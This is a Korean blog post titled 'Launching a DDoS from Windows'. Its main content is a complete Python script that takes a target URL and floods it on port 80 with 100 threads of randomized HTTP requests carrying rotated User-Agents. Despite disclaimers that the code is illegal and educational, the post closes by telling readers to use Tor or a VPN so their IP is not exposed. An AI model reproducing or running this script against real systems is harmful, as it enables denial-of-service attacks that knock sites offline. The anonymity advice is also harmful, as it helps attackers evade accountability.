---
layout: single
title:  "윈도우에서 디도스 날려보기"
categories: "Secure"
tag: "Secure"
toc: true
author_profile: false
sidebar:
    nav: "docs"
---

# 윈도우에서 디도스를 날려보자.
일단 이거 불법이니까, 절대 사설 홈페이지에 날리면 안된다.  
이런 식으로 진행이 된다 정도만 알아보는 식으로 배우는 걸로 하고, 절대 이 코드를 악용하거나 그러지 않길 바란다.    

디도스는, 한 주소에 패킷을 미친듯이 날려 시스템 과부화를 유도하는 기법이다.  
아래와 같은 코드를 통해서, 디도스를 날릴 수 있다.  
다시 한번 말 하지만, 절대 악용하지 말자. 그냥 가지고만 있던지 그래야지 사용해선 안된다.  

몇개의 패키지가 환경의 영향을 많이 받기 때문에, 다음의 코드는 윈도우 환경이 아니면 실행될 수 없게 하였다.  
중간의 로직을 변경하는 것으로 리눅스 환경에서도 실행할 수 있지만, 할꺼면 다른 패키지들 다시 알아보고 해야 할거다.  

```python
# 버전 정보
version = '3.0'

# 필요한 라이브러리 import
import os
import sys
import re
import signal
import socket
from random import randrange, choice
from threading import Thread
from argparse import ArgumentParser, RawTextHelpFormatter  # 명령어 인자 처리용

# 운영 체제가 윈도우인지 확인
if os.name != 'nt':
    sys.exit('[-] 이 스크립트는 윈도우 전용입니다.')

# 추가 모듈 설치 확인
try:
    import requests, colorama  # HTTP 요청 및 터미널 색상 출력을 위한 모듈
    from termcolor import colored, cprint  # 터미널에 컬러 출력
except ImportError:
    os.system('pip install colorama requests termcolor')
    sys.exit('[+] 필수 모듈을 설치하였습니다.')

# 윈도우의 경우 colorama 모듈 초기화
colorama.init()

# 시그널 핸들링 설정
signal.signal(signal.SIGINT, signal.SIG_DFL)

# 공격 대상 URL 입력 받기
def get_target_url():
    target_url = input('공격 대상 URL을 입력하세요: ')
    return target_url

# 가짜 IP 주소 생성 함수
def fake_ip():
    while True:
        ips = [str(randrange(0, 256)) for _ in range(4)]
        if ips[0] == "127":
            continue
        fkip = '.'.join(ips)
        break
    return fkip

# 대상 서버 확인 함수
def check_target(tgt):
    try:
        ip = socket.gethostbyname(tgt)
    except socket.gaierror:
        sys.exit(cprint('[-] 호스트를 찾을 수 없습니다.', 'red'))
    return ip

# User-Agent 목록 불러오기 함수
def add_useragent():
    try:
        with open("ua.txt", "r") as fp:
            uagents = re.findall(r"(.+)\n", fp.read())
    except FileNotFoundError:
        cprint('[-] \'ua.txt\' 파일을 찾을 수 없습니다.', 'yellow')
        return []
    return uagents

# Pyslow 공격 클래스
class Pyslow:
    def __init__(self, tgt, port, threads):
        self.tgt = tgt
        self.port = port
        self.threads = threads

    # 패킷 생성 함수
    def mypkt(self):
        text = choice(['GET', 'POST']) + ' /' + str(randrange(1, 999999999)) + ' HTTP/1.1\r\n' +\
               'Host: ' + self.tgt + '\r\n' +\
               'User-Agent: ' + choice(add_useragent()) + '\r\n' +\
               'Content-Length: 42\r\n'
        return text.encode()

    # 소켓 연결 생성 및 패킷 전송 함수
    def send_packet(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.tgt, self.port))
            sock.send(self.mypkt())
            sock.close()
        except Exception as e:
            cprint(f'[-] 연결 실패: {e}', 'red')

    # 공격 시작 함수
    def start_attack(self):
        threads = []
        for _ in range(self.threads):
            thread = Thread(target=self.send_packet)
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()

if __name__ == "__main__":
    target_url = get_target_url()
    target_ip = check_target(target_url)

    print(f'[+] 공격할 대상: {target_url} ({target_ip})')

    port = 80  # 기본 포트 번호 (HTTP)
    threads = 100  # 사용할 스레드 수
    ddos = Pyslow(target_ip, port, threads)
    ddos.start_attack()

```  

### 위의 코드는 자신의 URL을 숨길 수 없다.
따라서, tor 브라우저나, vpn을 사용해서 자신의 아이피를 들키지 않게끔 해야 노출을 막을 수 있다.  
위 코드는 교육용이지 공격용이 아니다. 그것만은 활실히 하자.  